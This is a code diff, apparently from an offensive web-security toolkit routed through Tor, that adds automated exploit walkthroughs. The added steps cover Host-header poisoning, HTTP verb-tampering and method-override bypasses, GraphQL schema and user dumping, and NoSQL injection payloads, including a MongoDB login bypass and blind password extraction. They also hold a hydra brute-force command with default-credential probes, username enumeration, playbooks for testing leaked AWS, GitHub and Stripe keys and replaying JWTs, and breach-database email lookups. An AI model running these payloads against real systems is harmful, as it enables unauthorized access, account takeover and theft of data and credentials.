+             "note": "Nonstandard but used by some middlewares"},
+            {"title": "Double-Host (duplicate header) trick",
+             "request": _get(
+                 target,
+                 extra_headers={"Host": f"{_hh_target_host}",
+                                "X-Forwarded-Host": _hh_marker},
+                 allow_redirects=False,
+             ),
+             "validate": _hh_check,
+             "note": "Legit Host + malicious X-Forwarded-Host often bypasses "
+                     "validators that only check Host"},
+            {"title": "Manual: test against the real reset flow",
+             "note": ("Many password-reset handlers build the reset "
+                      "email's link from the Host: header. Once you've "
+                      "confirmed above that Host reflects, exercise "
+                      "the REAL reset form manually — don't let the "
+                      "scanner fire it. Use a throwaway email with "
+                      "your chosen Host: header and watch the email "
+                      "for a link pointing at the marker host."),
+             "request": None},
+        ]
+
+    elif etype == "http_verb_tampering":
+        # Verb-tampering: retry the walled path with alternate verbs +
+        # method-override header. The finding already told us which
+        # path is walled, so we can go straight at it.
+        _vt_path = ei.get("path", "/admin")
+        _vt_url = base_url.rstrip("/") + _vt_path
+
+        def _vt_check(r: ExploitResult):
+            if not r.error and 200 <= r.status_code < 300:
+                r.success = True
+                r.confidence = 0.9
+                r.evidence = f"HTTP {r.status_code} on alt verb → bypass"
+                r.false_positive_risk = "low"
+            elif r.status_code in (401, 403):
+                r.evidence = f"HTTP {r.status_code} — still walled"
+                r.confidence = 0.1
+            elif r.status_code == 405:
+                r.evidence = "405 Method Not Allowed (auth rule fine)"
+                r.confidence = 0.05
+            elif r.status_code:
+                r.evidence = f"HTTP {r.status_code}"
+
+        steps = [
+            {"title": f"Baseline GET {_vt_path} (should be 401/403)",
+             "request": _get(_vt_url, allow_redirects=False),
+             "validate": _vt_check,
+             "note": "Confirms the wall is still in place"},
+        ]
+        for verb in ("HEAD", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"):
+            steps.append({
+                "title": f"Verb tamper: {verb} {_vt_path}",
+                "request": {"method": verb, "url": _vt_url,
+                            "allow_redirects": False},
+                "validate": _vt_check,
+                "note": f"{verb} slips past GET-only auth rule in some WAFs",
+            })
+        steps.extend([
+            {"title": "X-HTTP-Method-Override: GET",
+             "request": _get(_vt_url,
+                             extra_headers={"X-HTTP-Method-Override": "GET"},
+                             allow_redirects=False),
+             "validate": _vt_check,
+             "note": "Override header read after WAF rule fires"},
+            {"title": "X-HTTP-Method: GET",
+             "request": _get(_vt_url,
+                             extra_headers={"X-HTTP-Method": "GET"},
+                             allow_redirects=False),
+             "validate": _vt_check,
+             "note": "Same as above — alternate header name"},
+            {"title": "X-Method-Override: GET",
+             "request": _get(_vt_url,
+                             extra_headers={"X-Method-Override": "GET"},
+                             allow_redirects=False),
+             "validate": _vt_check,
+             "note": "Another common override header"},
+        ])
+
+    elif etype in ("graphql_introspection", "graphql_data_exposure"):
+        # GraphQL walkthrough: run introspection, then auto-derive
+        # queries for sensitive-looking types. The validator parses
+        # the JSON response and flags when __schema or any sensitive
+        # fields are returned.
+        _gql_path = ei.get("path", "/graphql")
+        _gql_url = base_url.rstrip("/") + _gql_path
+
+        def _gql_check(r: ExploitResult):
+            body = r.response_body or ""
+            try:
+                data = json.loads(body[:200000])
+            except Exception:
+                data = None
+            if isinstance(data, dict) and data.get("data"):
+                d = data["data"]
+                if isinstance(d, dict) and d.get("__schema"):
+                    types = d["__schema"].get("types", [])
+                    r.success = True
+                    r.confidence = 0.95
+                    r.evidence = (f"Introspection returned "
+                                  f"{len(types)} types")
+                    r.false_positive_risk = "very_low"
+                    return
+                # Other queries — any non-null data field is informative.
+                if any(v is not None for v in d.values() if isinstance(d, dict)):
+                    r.success = True
+                    r.confidence = 0.85
+                    r.evidence = "Query returned data"
+                    r.false_positive_risk = "low"
+                    return
+            if isinstance(data, dict) and data.get("errors"):
+                errs = data.get("errors", [])
+                msgs = [e.get("message", "") for e in errs[:3] if isinstance(e, dict)]
+                r.evidence = f"GraphQL errors: {' | '.join(msgs)[:120]}"
+                r.confidence = 0.2
+                return
+            if r.status_code and r.status_code >= 400:
+                r.evidence = f"HTTP {r.status_code}"
+                r.confidence = 0.1
+
+        _introspect_q = (
+            '{"query":"{ __schema { types { name fields '
+            '{ name type { name kind } } } } }"}'
+        )
+        _short_introspect = (
+            '{"query":"{ __schema { queryType { name } '
+            'mutationType { name } } }"}'
+        )
+        _common_queries = [
+            ('{"query":"{ users { id email username } }"}',
+             "enumerate users (common type names)"),
+            ('{"query":"{ me { id email role } }"}',
+             "current-user context"),
+            ('{"query":"{ products { id price } }"}',
+             "product listing"),
+            ('{"query":"{ orders { id userId total } }"}',
+             "order history"),
+        ]
+
+        steps = [
+            {"title": "Confirm GraphQL endpoint",
+             "request": _post(_gql_url, None,
+                              extra_headers={"Content-Type": "application/json"}),
+             "validate": _gql_check,
+             "note": ("Empty POST — server should reply with "
+                      "'Must provide query' JSON")},
+            {"title": "Short introspection (queryType / mutationType)",
+             "request": {"method": "POST", "url": _gql_url,
+                         "data": _short_introspect,
+                         "headers": {"Content-Type": "application/json"},
+                         "allow_redirects": True},
+             "validate": _gql_check,
+             "note": "If this works, full introspection is open"},
+            {"title": "Full introspection (dump whole schema)",
+             "request": {"method": "POST", "url": _gql_url,
+                         "data": _introspect_q,
+                         "headers": {"Content-Type": "application/json"},
+                         "allow_redirects": True},
+             "validate": _gql_check,
+             "warning": "Large response — full API surface area revealed",
+             "note": "Attack-surface map for every downstream step"},
+        ]
+        for q, desc in _common_queries:
+            steps.append({
+                "title": f"Test query: {desc}",
+                "request": {"method": "POST", "url": _gql_url,
+                            "data": q,
+                            "headers": {"Content-Type": "application/json"},
+                            "allow_redirects": True},
+                "validate": _gql_check,
+                "note": f"Many schemas expose these names",
+                "warning": "May dump sensitive data if unauthenticated",
+            })
+
+    elif etype == "sourcemap_exposure":
+        # Walkthrough for exposed source maps. Fetch the .map file and
+        # print the sources[] array so the operator sees exactly which
+        # modules got leaked.
+        _sm_url = target
+        def _sm_check(r: ExploitResult):
+            body = r.response_body or ""
+            try:
+                data = json.loads(body[:500000])
+            except Exception:
+                data = None
+            if isinstance(data, dict) and data.get("sources"):
+                src_paths = data["sources"]
+                if isinstance(src_paths, list) and src_paths:
+                    r.success = True
+                    r.confidence = 0.99
+                    r.evidence = (f"Source map exposes {len(src_paths)} "
+                                  f"source file(s). Sample: "
+                                  f"{src_paths[0][:80]}")
+                    r.false_positive_risk = "very_low"
+                    return
+            r.evidence = "Not a valid source map or sources missing"
+            r.confidence = 0.2
+
+        steps = [
+            {"title": "Fetch source map",
+             "request": _get(_sm_url),
+             "validate": _sm_check,
+             "note": "JSON with 'sources' and 'sourcesContent' arrays"},
+            {"title": "Parse sources[] — original source paths",
+             "note": ("Each entry in sources[] is an original file "
+                      "path. If sourcesContent[] is populated, the "
+                      "actual source code is in there base64/inlined."),
+             "request": None},
+        ]
+
+    elif etype == "js_secret_leak":
+        # Walkthrough for secrets discovered in same-origin JS bundles.
+        # Report-only — we don't fire live requests against the
+        # provider APIs (that would leak Tor-origin probes to
+        # third-party APIs we have no control over).
+        _secret_kind = ei.get("secret_kind", "unknown")
+        _provider_notes = {
+            "aws_key": ("Pair with the AWS secret from the same "
+                        "bundle (grep for 'AKIA' nearby). Test "
+                        "with `aws sts get-caller-identity` on a "
+                        "separate box — NEVER from this session."),
+            "github_token": ("Test scopes with `gh auth status` / "
+                             "`curl -H 'Authorization: token <tok>' "
+                             "https://api.github.com/user`. Stored "
+                             "GitHub tokens can repo/delete."),
+            "stripe_key": ("sk_live_ keys are DANGEROUS — they can "
+                           "charge cards and issue refunds. Test "
+                           "with the Stripe CLI in test mode only, "
+                           "or report to the target immediately."),
+            "jwt_token": ("Decode with jwt.io (or jwt-cli). Look at "
+                          "the 'exp' claim — if it's in the future, "
+                          "replay the token against authenticated "
+                          "endpoints."),
+        }
+        note = _provider_notes.get(
+            _secret_kind,
+            "Map the secret's format to a provider, test cautiously "
+            "from a separate host.")
+        steps = [
+            {"title": f"Secret type: {_secret_kind}",
+             "note": f"Evidence: {ei.get('method', note)[:200]}",
+             "request": None},
+            {"title": "Verification playbook",
+             "note": note,
+             "request": None},
+        ]
+
+    elif etype == "brute_force_viable":
+        # Brute-force walkthrough — generate a reference hydra cmd and a
+        # small credential-stuffing probe using the most common passwords.
+        # We do NOT actually run a wordlist — responsibility for a real
+        # brute-force stays with the operator.
+        _bf_url = target
+        _bf_path = ei.get("path", "/")
+        _bf_user_field = ei.get("username_field", "username")
+        _bf_pass_field = ei.get("password_field", "password")
+
+        _small_creds = [
+            ("admin", "admin"), ("admin", "password"),
+            ("admin", "admin123"), ("admin", "letmein"),
+            ("root", "root"), ("root", "toor"),
+            ("test", "test"), ("user", "user"),
+        ]
+
+        def _bf_check(r: ExploitResult):
+            # A successful login typically redirects (3xx to a dashboard
+            # path) or sets a session cookie. Flag any 2xx that's not
+            # the login page itself, or any 3xx Location that looks like
+            # a post-login page.
+            sc = r.status_code
+            loc = (r.response_headers.get("Location", "") or
+                   r.response_headers.get("location", ""))
+            if sc in (301, 302, 303, 307, 308) and loc:
+                low_loc = loc.lower()
+                if any(h in low_loc for h in
+                       ("dashboard", "account", "profile", "home",
+                        "welcome", "admin/index")):
+                    r.success = True
+                    r.confidence = 0.9
+                    r.evidence = f"Login succeeded — redirect to {loc[:80]}"
+                    r.false_positive_risk = "low"
+                    return
+            if sc == 200 and "Set-Cookie" in r.response_headers:
+                r.evidence = (f"200 with Set-Cookie — possibly successful; "
+                              f"verify manually")
+                r.confidence = 0.5
+                return
+            r.evidence = f"HTTP {sc}, no post-login redirect"
+            r.confidence = 0.05
+
+        steps = [{"title": "Reference: hydra command",
+                  "note": (f"hydra -L users.txt -P passwords.txt "
+                           f"-s <PORT> -f -m '/'{_bf_path}':"
+                           f"{_bf_user_field}=^USER^&"
+                           f"{_bf_pass_field}=^PASS^:F=<failure_string>' "
+                           f"{urlparse(_bf_url).netloc} http-post-form")}]
+        for u, p in _small_creds:
+            steps.append({
+                "title": f"Probe: {u}:{p}",
+                "request": _post(_bf_url,
+                                 {_bf_user_field: u, _bf_pass_field: p},
+                                 extra_headers=None),
+                "validate": _bf_check,
+                "note": f"Common default credential pair",
+            })
+        # Also override: ensure allow_redirects=False for every step
+        # so we can see the raw response and Location header.
+        for s in steps[1:]:
+            if "request" in s:
+                s["request"]["allow_redirects"] = False
+
+    elif etype == "user_enumeration":
+        # User enumeration: probe a small list of common usernames and
+        # compare response sizes to the bogus-username baseline.
+        _ue_url = target
+        _ue_path = ei.get("path", "/")
+
+        _common_users = [
+            "admin", "administrator", "root", "test", "user", "demo",
+            "guest", "support", "help", "info",
+        ]
+
+        _bogus_user = f"gs_{secrets.token_hex(4)}"
+        _bogus_len_holder: List[int] = []
+
+        def _ue_baseline(r: ExploitResult):
+            _bogus_len_holder.append(len(r.response_body or ""))
+            r.evidence = (f"Baseline (wrong-user) length: "
+                          f"{_bogus_len_holder[-1]}")
+
+        def _ue_probe(r: ExploitResult):
+            if not _bogus_len_holder:
+                r.evidence = "Baseline not captured"
+                return
+            base_len = _bogus_len_holder[0]
+            cur_len = len(r.response_body or "")
+            delta = abs(cur_len - base_len)
+            if base_len > 0 and delta > base_len * 0.2:
+                r.success = True
+                r.confidence = 0.85
+                r.evidence = (f"Length diff: {cur_len} vs baseline "
+                              f"{base_len} (delta={delta}) — username "
+                              f"likely exists")
+                r.false_positive_risk = "low"
+            else:
+                r.evidence = (f"Length similar to baseline "
+                              f"({cur_len} vs {base_len}) — username "
+                              f"probably doesn't exist")
+                r.confidence = 0.2
+
+        steps = [
+            {"title": "Baseline (bogus username)",
+             "request": _post(_ue_url,
+                              {"username": _bogus_user,
+                               "password": secrets.token_hex(4)}),
+             "validate": _ue_baseline,
+             "note": "Capture response length for bogus user"},
+        ]
+        for u in _common_users:
+            steps.append({
+                "title": f"Probe: {u}",
+                "request": _post(_ue_url,
+                                 {"username": u,
+                                  "password": secrets.token_hex(4)}),
+                "validate": _ue_probe,
+                "note": f"If response length differs, '{u}' exists",
+            })
+
+    elif etype == "nosql_injection":
+        # NoSQL walkthrough — try [$ne], [$gt], [$regex], and the
+        # JSON-body shape that MongoDB drivers accept.
+        _nq_param = param or "id"
+        _nq_base = target.split("?")[0]
+
+        def _nq_check(r: ExploitResult):
+            body = r.response_body or ""
+            for ind in (
+                _re.compile(r"MongoError|MongoServerError", _re.I),
+                _re.compile(r"E11000 duplicate key", _re.I),
+                _re.compile(r"CastError:.*ObjectId", _re.I),
+                _re.compile(r"\$where.*not allowed", _re.I),
+                _re.compile(r"unknown top level operator", _re.I),
+            ):
+                if ind.search(body[:6000]):
+                    r.success = True
+                    r.confidence = 0.9
+                    r.evidence = f"NoSQL error: {ind.pattern[:40]}"
+                    r.false_positive_risk = "low"
+                    return
+            if r.status_code == 200 and len(body) > 200:
+                r.confidence = 0.5
+                r.evidence = (f"HTTP 200 with {len(body)}-byte body — "
+                              f"check response manually for enumerated data")
+                r.false_positive_risk = "medium"
+
+        steps = [
+            {"title": "Baseline (bogus scalar)",
+             "request": _get(_nq_base,
+                             extra_params={_nq_param: f"xx{secrets.token_hex(3)}"}),
+             "validate": _nq_check,
+             "note": "Capture baseline length / status for boolean compare"},
+            {"title": "$ne operator (always-true)",
+             "request": _get(_nq_base,
+                             extra_params={f"{_nq_param}[$ne]": "0"}),
+             "validate": _nq_check,
+             "note": "Coerces every document to match. More data in "
+                     "response = confirmed."},
+            {"title": "$gt operator (always-true)",
+             "request": _get(_nq_base,
+                             extra_params={f"{_nq_param}[$gt]": ""}),
+             "validate": _nq_check,
+             "note": "Same idea as $ne"},
+            {"title": "$regex operator (pattern matching)",
+             "request": _get(_nq_base,
+                             extra_params={f"{_nq_param}[$regex]": ".*"}),
+             "validate": _nq_check,
+             "note": "Data extraction primitive — returns any document"},
+            {"title": "$where JS injection",
+             "request": _get(_nq_base,
+                             extra_params={f"{_nq_param}[$where]": "1==1"}),
+             "validate": _nq_check,
+             "warning": "MongoDB $where runs JavaScript — full RCE class",
+             "risk": "HIGH"},
+            {"title": "JSON body auth-bypass shape",
+             "request": _post(
+                 _nq_base,
+                 {"username": "admin", "password": '{"$ne": null}'},
+             ),
+             "validate": _nq_check,
+             "warning": "Common MongoDB login bypass — no password check",
+             "note": "{'$ne': null} matches any document"},
+            {"title": "Blind boolean: password $regex",
+             "request": _post(
+                 _nq_base,
+                 {"username": "admin",
+                  "password": '{"$regex": "^a"}'},
+             ),
+             "validate": _nq_check,
+             "note": "Extracts the password one character at a time "
+                     "by iterating ^a, ^b, ^aa, ^ab, ..."},
+        ]
 
     else:
         steps = [
@@ -4700,11 +5485,11 @@ def flow_intel(detected_port=None):
 
         print(f"  {B}Ephemeral Exploit Files:{N}")
         print(f"  {'─' * 55}")
-        for f in exploit_files:
+        for idx, f in enumerate(exploit_files, 1):
             size_kb = f.stat().st_size / 1024
             age_min = (_time_mod.time() - f.stat().st_mtime) / 60
             age_str = f"{age_min:.0f}m ago" if age_min < 60 else f"{age_min/60:.1f}h ago"
-            print(f"    {f.name:35s}  {size_kb:.1f}KB  {age_str}")
+            print(f"    {idx:>2}  {f.name:35s}  {size_kb:.1f}KB  {age_str}")
         print()
         print(f"  {B}Actions:{N}")
         print(f"    {G}1{N}  View a file")
@@ -4854,7 +5639,9 @@ def flow_intel(detected_port=None):
                 ck = ck.strip()
                 if "=" in ck:
                     args.extend(["--cookie", ck])
-        if run_script(INTEL / "testergatherSystem", args, "Intel scan"):
+        if run_script(INTEL / "testergatherSystem", args, "Intel scan",
+                       keep_env=("HIBP_KEY", "DEHASHED_KEY",
+                                 "DEHASHED_EMAIL", "COINGECKO_API_KEY")):
             if depth == "deep":
                 print()
                 print(f"  {B}Post-scan options:{N}")
@@ -4873,8 +5660,28 @@ def flow_intel(detected_port=None):
         if not email or "@" not in email:
             err("Valid email address required.")
             return
+        # Proactive sanity check — the child script silently no-ops
+        # when the API keys aren't set, which confuses operators into
+        # thinking the breach databases have no records on the email.
+        _have_hibp = bool(os.environ.get("HIBP_KEY"))
+        _have_dehashed = bool(os.environ.get("DEHASHED_KEY") and
+                              os.environ.get("DEHASHED_EMAIL"))
+        if not _have_hibp and not _have_dehashed:
+            warn("No breach-database API keys configured.")
+            info("Set HIBP_KEY (https://haveibeenpwned.com/API/Key) or")
+            info("DEHASHED_EMAIL + DEHASHED_KEY (https://dehashed.com/api)")
+            info("in your environment before launching, then retry.")
+            if not confirm("Continue anyway? (will produce empty results)"):
+                return
+        elif os.environ.get("DEHASHED_KEY") and not os.environ.get("DEHASHED_EMAIL"):
+            warn("DEHASHED_KEY is set but DEHASHED_EMAIL is not — "
+                 "DeHashed auth will fail. Set both to use DeHashed.")
         args = ["--email", email, "--tor-proxy", tor]
-        run_script(INTEL / "testergatherSystem", args, "Breach check")
+        # Breach-DB API keys are normally stripped from child env by the
+        # default-deny policy. Let them through here or the breach
+        # check is a silent no-op.
+        run_script(INTEL / "testergatherSystem", args, "Breach check",
+                   keep_env=("HIBP_KEY", "DEHASHED_KEY", "DEHASHED_EMAIL"))
 
     elif mode == "3":
         query = prompt("Search query")
@@ -4890,20 +5697,30 @@ def flow_intel(detected_port=None):
         if not filepath:
             err("File path is required.")
             return
-        if not Path(filepath).exists():
+        # run_script() chdirs child into ROOT, so a relative path
+        # entered by the operator (resolved against their shell's
+        # CWD) would suddenly resolve against ROOT inside the child
+        # and silently miss the file. Resolve once, here, so what the
+        # user typed is what the child sees.
+        filepath_abs = str(Path(filepath).expanduser().resolve())
+        if not Path(filepath_abs).exists():
             err(f"File not found: {Path(filepath).name}")
             return
         depth = prompt("Scan depth (quick/full/deep)", "full").lower()
         if depth not in ("quick", "full", "deep"):
             depth = "full"
-        args = ["--file", filepath, "--scan", depth, "--tor-proxy", tor]
+        args = ["--file", filepath_abs, "--scan", depth, "--tor-proxy", tor]
         cookie_input = prompt("Session cookies (name=value, comma-separated, or Enter to skip)", "")
         if cookie_input.strip():
             for ck in cookie_input.split(","):
                 ck = ck.strip()
                 if "=" in ck:
                     args.extend(["--cookie", ck])
-        run_script(INTEL / "testergatherSystem", args, "Batch intel")
+        # Batch mode can dispatch to breach checks for email targets, so
+        # let the API keys through too.
+        run_script(INTEL / "testergatherSystem", args, "Batch intel",
+                   keep_env=("HIBP_KEY", "DEHASHED_KEY",
+                             "DEHASHED_EMAIL", "COINGECKO_API_KEY"))
 
     else:
         warn(f"Unknown mode: {mode}")
